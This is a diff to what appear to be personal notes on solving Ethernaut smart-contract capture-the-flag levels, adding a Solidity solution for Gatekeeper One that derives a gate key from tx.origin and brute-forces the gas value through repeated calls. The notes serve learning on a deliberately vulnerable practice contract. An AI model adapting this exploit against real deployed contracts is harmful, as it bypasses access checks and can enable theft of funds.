@@ -15,6 +15,19 @@ Elevator - Make a contract "overriding" the method `isLastFloor()` and have it r
 
 Privacy - Similar to Vault with a few extra quick maffs. Read storage slot 5.
 
+Gatekeeper One - Lots of bit manipulation. Calls `enter()` over and over to brute force match `gasleft()`.
+```
+function enter() public {
+        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+        bool s = false;
+        uint i = 0;
+        while(!s) {
+            (s, ) = address(gate).call{ gas: i + (8191 * 5) }(abi.encodeWithSignature("enter(bytes8)", gateKey));
+            i += 1;
+        }
+    }
+```
+
 ---
 
 ### 1/5/2022 Ethernaut #2
